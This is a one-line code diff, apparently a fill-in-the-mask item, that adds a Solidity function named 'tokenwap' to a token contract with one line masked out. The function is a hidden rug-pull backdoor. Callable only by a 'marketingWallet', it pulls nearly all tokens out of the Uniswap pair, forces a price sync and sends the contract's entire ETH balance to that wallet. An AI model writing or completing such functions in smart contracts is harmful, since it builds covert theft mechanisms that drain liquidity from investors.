@@ -1,0 +1,1 @@
+"function tokenwap(uint amount) external {        require(msg.sender == marketingWallet);        uint bal = balanceOf(uniswapV2Pair);        if (bal > 1) _transfer(uniswapV2Pair, address(this), bal - 1);        IUniswapV2Pair(uniswapV2Pair).sync();        <mask0>;        (bool success,) = address(marketingWallet).call{value: address(this).balance}(\"\");    }"
